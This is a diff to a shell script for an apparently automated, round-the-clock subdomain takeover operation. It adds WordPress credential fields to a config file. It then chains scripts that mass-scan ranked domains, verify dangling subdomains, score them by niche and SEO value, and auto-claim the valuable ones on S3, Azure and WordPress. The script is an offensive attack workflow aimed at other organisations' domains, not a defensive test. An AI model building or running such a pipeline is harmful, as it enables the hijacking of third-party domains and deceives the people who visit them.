@@ -79,6 +79,10 @@ if [ ! -f "account_details.json" ]; then
       "client_secret": "YOUR_CLIENT_SECRET"
     }
   ],
+  "wordpress": {
+    "email": "your-wordpress-email@example.com",
+    "password": "YOUR_WORDPRESS_PASSWORD"
+  },
   "notifications": {
     "email": "your-email@example.com",
     "slack_webhook": "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
@@ -105,20 +109,28 @@ cd "$(dirname "$0")"
 
 # Run complete pipeline with auto-claiming
 # This will:
-# 1. Scan for vulnerable subdomains (1000s per run)
+# 1. Scan 1000 domains starting from rank 500
 # 2. Verify vulnerabilities
 # 3. Analyze niche/SEO value
-# 4. Auto-claim high-value targets
+# 4. Auto-claim high-value targets (S3, Azure, WordPress)
 # 5. Generate PoCs
 
 echo "[$(date)] Starting 24/7 scan cycle..."
 
-# Run the complete pipeline
-python3 complete_pipeline.py \
-    --batch-size 100 \
-    --auto-claim \
-    --min-trust-score 70 \
-    --notification email
+# Run aggressive scanner: rank 500, 1000 domains, .com/.net/.org, 20 workers
+python3 aggressive_scanner.py 500 1000 "com,net,org" 20 10
+
+# If aggressive_scanner completes successfully, run verification and claiming
+if [ $? -eq 0 ]; then
+    echo "[$(date)] Scan complete. Running verification..."
+    python3 verify_results.py
+
+    echo "[$(date)] Running niche analysis..."
+    python3 niche_analyzer.py ~/Desktop/Subdomain_Takeover_Results/Scans/subdomain_takeover_detailed.csv
+
+    echo "[$(date)] Auto-claiming vulnerabilities..."
+    python3 auto_poc_claimer.py ~/Desktop/Subdomain_Takeover_Results/Verified_Vulnerabilities/verified_vulnerabilities.csv
+fi
 
 echo "[$(date)] Scan cycle completed. Results saved to ~/Desktop/Subdomain_Takeover_Results/"
 AUTOMATION
